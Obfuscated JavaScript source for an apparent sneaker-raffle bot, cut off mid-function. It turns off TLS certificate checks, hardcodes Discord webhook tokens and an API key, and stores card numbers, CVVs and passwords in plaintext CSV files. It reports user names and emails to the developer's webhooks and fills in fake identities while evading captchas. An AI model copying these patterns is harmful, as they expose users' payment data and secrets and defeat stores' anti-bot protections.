process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x4a3ff4 = require('fs'), _0x2fcb2b = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x3a5c39(_0x597fb4) {
    const _0x286561 = _0x4a3ff4['createWriteStream'](_0x597fb4, { 'flags': 'a' }), _0x1f519e = console['log'];
    console['log'] = function () {
        const _0x187f8b = Array['prototype']['slice']['call'](arguments), _0x406bfa = _0x187f8b['join']('\x20') + '\x0a';
        _0x286561['write'](_0x406bfa), _0x1f519e['apply'](console, _0x187f8b);
    };
}
_0x3a5c39('../logs/log\x20' + _0x2fcb2b);
var _0x3abd6a = require('tough-cookie'), _0x2b87aa = require('node-imap'), _0x1017b4 = require('util')['inspect'];
const _0x554795 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x1caf53 } = require('discord.js');
var _0x8f1fe9 = require('exe');
const { execFile: _0x2e37fc } = require('child_process'), _0x181ece = require('puppeteer-extra'), _0x2dba44 = require('puppeteer-extra-plugin-recaptcha'), _0x26fa28 = require('puppeteer-extra-plugin-stealth'), _0x218a39 = require('chalk'), _0x3e0125 = require('node-bash-title'), _0x52d98a = require('axios'), _0x566459 = require('papaparse');
var _0x57e079 = require('random-name');
const _0x35490a = require('request');
var _0x44d22d = require('prompt');
const _0x453a7b = _0x35490a['jar']();
var _0x579cef = {};
const _0x27a806 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x179180 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x536a06 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x5d4e5a = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x5812ec = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x3fe181 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x50b45e = 'https://discord.com/api/webhooks/', _0x5aea19 = '' + _0x50b45e + _0x536a06, _0x1acce0 = '' + _0x50b45e + _0x5d4e5a, _0x1f75ad = '' + _0x50b45e + _0x27a806, _0x2631ac = '' + _0x50b45e + _0x179180, _0x2aae93 = '' + _0x50b45e + _0x5812ec, _0xc085cc = '' + _0x50b45e + _0x3fe181;
const _0x244fd9 = JSON['parse'](_0x4a3ff4['readFileSync']('../package.json', 'utf-8')), _0x4a92ac = _0x244fd9['version'];
var _0x5d3bce, _0x2ffd47, _0x5d1922, _0x1529d5, _0x12b037, _0x115a3b, _0x3f93ac, _0x1cea63;
const _0x135046 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x18efdc = ![];
const _0x4a2fa8 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x51bdd9 = '0123456789';
var _0xcdabdf = _0x4a2fa8['split']('');
const _0x375c6a = require('auto-git-update'), _0x2e8feb = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x3a4d09 = new _0x375c6a(_0x2e8feb);
async function _0x4d056c() {
    _0x12b037 = _0x4a3ff4['readdirSync']('../proxies'), _0x1529d5 = _0x4a3ff4['readdirSync']('../tasks'), !_0x4a3ff4['existsSync']('../accounts/fenom.csv') && _0x4a3ff4['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x4a3ff4['existsSync']('../accounts/paypal.csv') && _0x4a3ff4['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x4a3ff4['existsSync']('../accounts/bstn.csv') && _0x4a3ff4['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x4a3ff4['existsSync']('../accounts/eql.csv') && _0x4a3ff4['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x4a3ff4['existsSync']('../failed-tasks.csv') && _0x4a3ff4['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x4a3ff4['existsSync']('../successful-tasks.csv') && _0x4a3ff4['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x579cef = JSON['parse'](_0x4a3ff4['readFileSync']('../settings.json', 'utf-8')), !_0x579cef['delay'] && (_0x579cef['delay'] = 0x3c, _0x4a3ff4['writeFileSync']('../settings.json', JSON['stringify'](_0x579cef, null, 0x2))), !_0x579cef['threads'] && (_0x579cef['threads'] = 0x1, _0x4a3ff4['writeFileSync']('../settings.json', JSON['stringify'](_0x579cef, null, 0x2))), !_0x579cef['masterMail'] && (_0x579cef['masterMail'] = 'yourmail@gmail.com', _0x4a3ff4['writeFileSync']('../settings.json', JSON['stringify'](_0x579cef, null, 0x2))), !_0x579cef['masterPassword'] && (_0x579cef['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x4a3ff4['writeFileSync']('../settings.json', JSON['stringify'](_0x579cef, null, 0x2))), !_0x579cef['captchaKey'] && (_0x579cef['captchaKey'] = '', _0x4a3ff4['writeFileSync']('../settings.json', JSON['stringify'](_0x579cef, null, 0x2))), !_0x579cef['useRandomProxy'] && (_0x579cef['useRandomProxy'] = !![], _0x4a3ff4['writeFileSync']('../settings.json', JSON['stringify'](_0x579cef, null, 0x2))), !_0x579cef['shuffleTasks'] && (_0x579cef['shuffleTasks'] = ![], _0x4a3ff4['writeFileSync']('../settings.json', JSON['stringify'](_0x579cef, null, 0x2))), !_0x579cef['webhook'] && (_0x579cef['webhook'] = '', _0x4a3ff4['writeFileSync']('../settings.json', JSON['stringify'](_0x579cef, null, 0x2))), _0x579cef['delay'] <= 0x1388 && (_0x579cef['delay'] = _0x579cef['delay'] * 0x3e8), _0x579cef['AfewDelay'] && (delete _0x579cef['AfewDelay'], _0x4a3ff4['writeFileSync']('../settings.json', JSON['stringify'](_0x579cef, null, 0x2))), _0x579cef['MahaDelay'] && (delete _0x579cef['MahaDelay'], _0x4a3ff4['writeFileSync']('../settings.json', JSON['stringify'](_0x579cef, null, 0x2))), _0x579cef['footshopDelay'] && (delete _0x579cef['footshopDelay'], _0x4a3ff4['writeFileSync']('../settings.json', JSON['stringify'](_0x579cef, null, 0x2))), _0x579cef['MahaDelay'] = _0x579cef['delay'], _0x50b45e = _0x579cef['webhook'], _0x115a3b = _0x579cef['licenseKey'];
}
let _0x30c7b8, _0x30b356 = [], _0x3f3214;
const _0xaebb71 = _0x3949dd => new Promise(_0x156c64 => setTimeout(_0x156c64, _0x3949dd));
function _0x8794b(_0x20f41f, _0x1b9e33) {
    return Math['floor'](Math['random']() * (_0x1b9e33 - _0x20f41f + 0x1) + _0x20f41f);
}
function _0x3ae1e2(_0x458e03) {
    let _0x256831 = _0x458e03['length'], _0x4e1a1b;
    while (_0x256831 != 0x0) {
        _0x4e1a1b = Math['floor'](Math['random']() * _0x256831), _0x256831--, [_0x458e03[_0x256831], _0x458e03[_0x4e1a1b]] = [
            _0x458e03[_0x4e1a1b],
            _0x458e03[_0x256831]
        ];
    }
    return _0x458e03;
}
async function _0x29ea9b(_0x3a3443) {
    return _0x52d98a['get']('https://api.hyper.co/v4/licenses/' + _0x3a3443, { 'headers': { 'Authorization': 'Bearer\x20' + _0x135046 } })['then'](_0x3916ca => _0x3916ca['data'])['catch'](() => null);
}
;
async function _0x188c66(_0x48e209) {
    console['clear']();
    if (_0x48e209 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x1d17d9 = await _0x44d22d['get']('License');
        if (_0x1d17d9['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0xaebb71(0xbb8), _0x188c66(_0x48e209);
        _0x48e209 = _0x1d17d9['License'], _0x579cef['licenseKey'] = _0x48e209, _0x115a3b = _0x48e209, _0x4a3ff4['writeFileSync']('../settings.json', JSON['stringify'](_0x579cef));
    }
    console['log']('Checking\x20license\x20' + _0x115a3b + '...'), await _0xaebb71(0x320);
    const _0xe1d4e6 = await _0x29ea9b(_0x48e209);
    _0x3f93ac = JSON['stringify'](_0xe1d4e6['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x1cea63 = JSON['stringify'](_0xe1d4e6['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0xe1d4e6)
        return console['log']('License\x20not\x20found');
    if (!_0xe1d4e6['user'])
        return console['log']('License\x20not\x20bound');
    return _0xe1d4e6['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x18efdc = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x18efdc = ![]);
}
async function _0x3175fb() {
    var _0x426373 = await _0x44d22d['get']('Module');
    return console['clear'](), _0x426373['Module'];
}
;
async function _0x55ed9c() {
    var _0x4e6af1 = await _0x44d22d['get']('Setting');
    return console['clear'](), _0x4e6af1['Setting'];
}
async function _0x54af71(_0x3caa2a) {
    var _0xddfb2a = [];
    for (file of _0x1529d5) {
        var _0x7a95e8 = _0x4a3ff4['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x566459['parse'](_0x7a95e8, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x3caa2a['store'] && _0xddfb2a['push'](file);
    }
    !_0xddfb2a['length'] == 0x0 && (_0x1529d5 = _0xddfb2a);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x15c2c6 = 0x0; _0x15c2c6 < _0x1529d5['length']; _0x15c2c6++) {
        console['log']('\x20(' + _0x15c2c6 + ')\x20' + _0x1529d5[_0x15c2c6]);
    }
    console['log']('');
    var _0x6cea86 = await _0x44d22d['get']('Task');
    if (_0x6cea86['Task'] > _0x1529d5['length'] - 0x1 || isNaN(_0x6cea86['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0xaebb71(0x3e8), _0x54af71();
    var _0xe1e3bb = _0x4a3ff4['readFileSync']('../tasks/' + _0x1529d5[_0x6cea86['Task']], 'utf-8');
    return _0x5d1922 = _0x566459['parse'](_0xe1e3bb, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x218a39['blue'](_0x1529d5[_0x6cea86['Task']])), _0x5d3bce = _0x1529d5[_0x6cea86['Task']], _0x5d1922;
}
async function _0x244d38() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x1b058d = 0x0; _0x1b058d < _0x12b037['length']; _0x1b058d++) {
        console['log']('\x20(' + _0x1b058d + ')\x20' + _0x12b037[_0x1b058d]);
    }
    console['log']('');
    var _0x569d48 = await _0x44d22d['get']('Proxies');
    if (_0x569d48['Proxies'] > _0x12b037['length'] - 0x1 || isNaN(_0x569d48['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0xaebb71(0x3e8), _0x244d38();
    var _0x4b2d08 = _0x4a3ff4['readFileSync']('../proxies/' + _0x12b037[_0x569d48['Proxies']], 'utf-8')['split']('\x0a');
    let _0xcd1693 = _0x4b2d08['map']((_0x3d315d, _0x5e1a41) => {
        sanatizeProxy = _0x3d315d['replace']('\x0d', '');
        if (_0x4b2d08[_0x5e1a41 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2ffd47 = _0x12b037[_0x569d48['Proxies']], console['clear'](), _0xcd1693;
}
async function _0x1cb637() {
    var _0x40640f = await _0x44d22d['get']('Value');
    return console['clear'](), _0x40640f['Value'];
}
async function _0xcb20c7(_0x1404aa) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x1276b4 = 0x0; _0x1276b4 < _0x1404aa['length']; _0x1276b4++) {
        console['log']('\x20(' + _0x1276b4 + ')\x20[' + _0x1404aa[_0x1276b4]['name'] + ']');
    }
    ;
    console['log']('');
    var _0xc25793 = await _0x44d22d['get']('Module');
    return _0xc25793['Module'];
}
async function _0x36a717() {
    var _0x3f29bf = await _0x44d22d['get']('Password');
    return console['clear'](), _0x3f29bf['Password'];
}
;
async function _0xa6ded8() {
    var _0x3f81d4 = await _0x44d22d['get']('Links');
    return _0x3f81d4['Links'];
}
;
async function _0x25067c() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x2b3197 = 0x0; _0x2b3197 < _0x30b356['length']; _0x2b3197++) {
        console['log']('\x20(' + _0x2b3197 + ')\x20' + _0x30b356[_0x2b3197]);
    }
    ;
    console['log']();
    let _0x267547 = await _0x44d22d['get']('Product');
    return console['clear'](), _0x267547['Product'];
}
;
function _0x11b348() {
    var _0x4a91ef = new Date(Date['now']())['toLocaleTimeString']();
    return _0x4a91ef;
}
;
function _0x5ebc00() {
    var _0x2051ce = new Date(Date['now']())['toLocaleString']();
    return _0x2051ce['replace'](',', '');
}
async function _0x4401f2(_0x34f76c, _0x5ae6d6) {
    let _0x5c0513 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x4a92ac != 'devkey') {
        await _0x52d98a['post'](_0x34f76c, _0x5ae6d6, _0x5c0513);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x3ead77(_0x164c3d, _0x36285b, _0x1503b5, _0x1f08e4, _0x466142) {
    if (!_0x1f08e4 && _0x1503b5 == 'dev') {
        var _0x3103ae = new _0x1caf53()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x36285b['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x36285b['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x164c3d['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x579cef['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x3f93ac,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x164c3d['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x164c3d['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x4a92ac,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x3103ae['data'];
    } else {
        if (_0x1f08e4 && _0x1503b5 == 'dev') {
            var _0x3103ae = new _0x1caf53()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x36285b['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x3f93ac,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x36285b['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x164c3d['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x579cef['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x466142,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x164c3d['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x164c3d['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x4a92ac,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x3103ae['data'];
        } else {
            if (_0x1503b5 == 'pub') {
                var _0x3103ae = new _0x1caf53()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x36285b['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x36285b['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x164c3d['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x579cef['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x164c3d['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x4a92ac,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x3103ae['data'];
            } else {
                if (_0x1503b5 == 'acc' && !_0x1f08e4) {
                    var _0x3103ae = new _0x1caf53()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x36285b['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x3f93ac,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x36285b['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x579cef['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x4a92ac,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x3103ae['data'];
                } else {
                    if (_0x1503b5 == 'acc' && _0x1f08e4) {
                        var _0x3103ae = new _0x1caf53()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x36285b['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x3f93ac,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x466142,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x36285b['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x579cef['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x4a92ac,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x3103ae['data'];
                    } else {
                        if (_0x1503b5 == 'open') {
                            var _0x3103ae = new _0x1caf53()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x1cea63)['addFields']({
                                'name': 'User',
                                'value': '' + _0x3f93ac,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x4a92ac,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x3103ae['data'];
                        } else {
                            if (!_0x1f08e4 && _0x1503b5 == 'ver') {
                                var _0x3103ae = new _0x1caf53()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x36285b['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x3f93ac,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x36285b['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x579cef['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x4a92ac,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x3103ae['data'];
                            } else {
                                if (_0x1f08e4 && _0x1503b5 == 'ver') {
                                    var _0x3103ae = new _0x1caf53()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x36285b['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x3f93ac,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x466142,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x36285b['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x579cef['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x4a92ac,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x3103ae['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x48a0b3(_0x3069e7, _0x3b8832) {
    var _0x54186b = _0x3069e7[_0x3b8832]['Address1']['split'](''), _0x1fe69b = _0x3069e7[_0x3b8832]['Address2']['split'](''), _0x320e6e = _0x3069e7[_0x3b8832]['Email']['split']('@');
    for (var _0x20f34d = 0x0; _0x20f34d < _0x54186b['length']; _0x20f34d++) {
        if (_0x54186b[_0x20f34d] == 'X') {
            var _0x577070 = Math['round'](Math['random']() * (_0x4a2fa8['length'] - 0x1));
            _0x54186b[_0x20f34d] = _0xcdabdf[_0x577070];
        }
    }
    ;
    for (var _0x20f34d = 0x0; _0x20f34d < _0x1fe69b['length']; _0x20f34d++) {
        if (_0x1fe69b[_0x20f34d] == 'X') {
            var _0x577070 = Math['round'](Math['random']() * (_0x4a2fa8['length'] - 0x1));
            _0x1fe69b[_0x20f34d] = _0xcdabdf[_0x577070];
        }
    }
    ;
    _0x3069e7[_0x3b8832]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x3069e7[_0x3b8832]['FirstName'] = _0x57e079['first']());
    _0x3069e7[_0x3b8832]['LastName']['toUpperCase']() == 'RANDOM' && (_0x3069e7[_0x3b8832]['LastName'] = _0x57e079['last']());
    _0x320e6e[0x0]['toUpperCase']() == 'RANDOM' ? _0x320e6e[0x0] = '' + _0x57e079['first']() + _0x57e079['last']() + _0x8794b(0x1, 0x270f) + '@' : _0x320e6e[0x0] = _0x320e6e[0x0] + '@';
    _0x3069e7[_0x3b8832]['Email'] = _0x320e6e['join'](''), _0x3069e7[_0x3b8832]['Address1'] = _0x54186b['join'](''), _0x3069e7[_0x3b8832]['Address2'] = _0x1fe69b['join']('');
    _0x3069e7[_0x3b8832]['Phone'] == 'RANDOM' && (_0x3069e7[_0x3b8832]['Phone'] = '0' + _0x8794b(0x5f5e100, 0x3b9ac9ff));
    if (_0x3069e7[_0x3b8832]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x5aecab = _0x8794b(0x1, 0x270f);
        _0x3069e7[_0x3b8832]['Follower'] = '' + _0x57e079['first']() + _0x57e079['last']() + _0x5aecab + '\x20';
    }
    _0x3069e7[_0x3b8832]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x3069e7[_0x3b8832]['HouseNumber'] = _0x8794b(0x1, 0xc8));
    if (_0x3069e7[_0x3b8832]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x1c8d45 = Math['round'](Math['random']() * (_0x4a2fa8['length'] - 0x1)), _0x51a2dd = _0xcdabdf[_0x1c8d45];
        _0x3069e7[_0x3b8832]['Address1'] = _0x57e079['last']() + 'straat', _0x3069e7[_0x3b8832]['Zip'] == '' && (_0x3069e7[_0x3b8832]['Postcode'] = _0x8794b(0x3e8, 0x270f) + '\x20' + _0x51a2dd + _0x51a2dd, _0x3069e7[_0x3b8832]['Zip'] = _0x3069e7[_0x3b8832]['Postcode']), _0x3069e7[_0x3b8832]['HouseNumber'] = '' + _0x8794b(0x1, 0xc8);
    }
    return;
}
;
async function _0x47d653(_0x40c2d3, _0xb2ac68) {
    _0x4a3ff4['appendFileSync']('../failed-tasks.csv', _0x5ebc00() + ',' + _0xb2ac68['store'] + ',' + _0xb2ac68['name'] + ',' + _0x40c2d3['Url'] + ',' + _0x40c2d3['Size'] + ',' + _0x40c2d3['Follower'] + ',' + _0x40c2d3['FirstName'] + ',' + _0x40c2d3['LastName'] + ',' + _0x40c2d3['Address1'] + ',' + _0x40c2d3['Address2'] + ',' + _0x40c2d3['HouseNumber'] + ',' + _0x40c2d3['Zip'] + ',' + _0x40c2d3['City'] + ',' + _0x40c2d3['State'] + ',' + _0x40c2d3['Country'] + ',' + _0x40c2d3['Phone'] + ',' + _0x40c2d3['Email'] + ',' + _0x40c2d3['Password'] + ',' + _0x40c2d3['PaymentMethod'] + ',' + _0x40c2d3['CardType'] + ',' + _0x40c2d3['NameOnCard'] + ',' + _0x40c2d3['CardNumber'] + ',' + _0x40c2d3['ExpiryDate'] + ',' + _0x40c2d3['CVV'] + ',' + _0x40c2d3['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x20f501(_0x41ed90, _0x440f24) {
    _0x4a3ff4['appendFileSync']('../successful-tasks.csv', _0x5ebc00() + ',' + _0x440f24['store'] + ',' + _0x440f24['name'] + ',' + _0x41ed90['Url'] + ',' + _0x41ed90['Size'] + ',' + _0x41ed90['Follower'] + ',' + _0x41ed90['FirstName'] + ',' + _0x41ed90['LastName'] + ',' + _0x41ed90['Address1'] + ',' + _0x41ed90['Address2'] + ',' + _0x41ed90['HouseNumber'] + ',' + _0x41ed90['Zip'] + ',' + _0x41ed90['City'] + ',' + _0x41ed90['State'] + ',' + _0x41ed90['Country'] + ',' + _0x41ed90['Phone'] + ',' + _0x41ed90['Email'] + ',' + _0x41ed90['Password'] + ',' + _0x41ed90['PaymentMethod'] + ',' + _0x41ed90['CardType'] + ',' + _0x41ed90['NameOnCard'] + ',' + _0x41ed90['CardNumber'] + ',' + _0x41ed90['ExpiryDate'] + ',' + _0x41ed90['CVV'] + ',' + _0x41ed90['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x1e4b97() {
    let _0x198fdc = proxyFile['split']('\x0a'), _0x5191be = _0x198fdc['map']((_0x36f739, _0x227d47) => {
        sanatizeProxy = _0x36f739['replace']('\x0d', '');
        if (_0x198fdc[_0x227d47 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x5191be;
}
;
async function _0x4e2ba6(_0x4e7501, _0x249852) {
    if (_0x5c0d77 != 'yes')
        var _0x5c0d77 = '', _0x21713d = 0x0;
    async function _0x34ce38() {
        var _0x6200dc = _0x4a3ff4['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x5ae8c9 = _0x566459['parse'](_0x6200dc, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x1f5e0e = 0x0; _0x1f5e0e < _0x5ae8c9['length']; _0x1f5e0e++) {
            console['log']('(' + _0x1f5e0e + ')\x20' + _0x5ae8c9[_0x1f5e0e]['Email']);
        }
        console['log']('\x0a(' + _0x5ae8c9['length'] + ')\x20' + _0x218a39['cyan']('Add\x20a\x20new\x20account'));
        let _0x5abb26 = await _0x44d22d['get']('Option');
        if (_0x5abb26['Option'] < _0x5ae8c9['length'])
            return _0x5ae8c9[_0x5abb26['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x59a443 = {}, _0x25c2fd = await _0x44d22d['get']('Email');
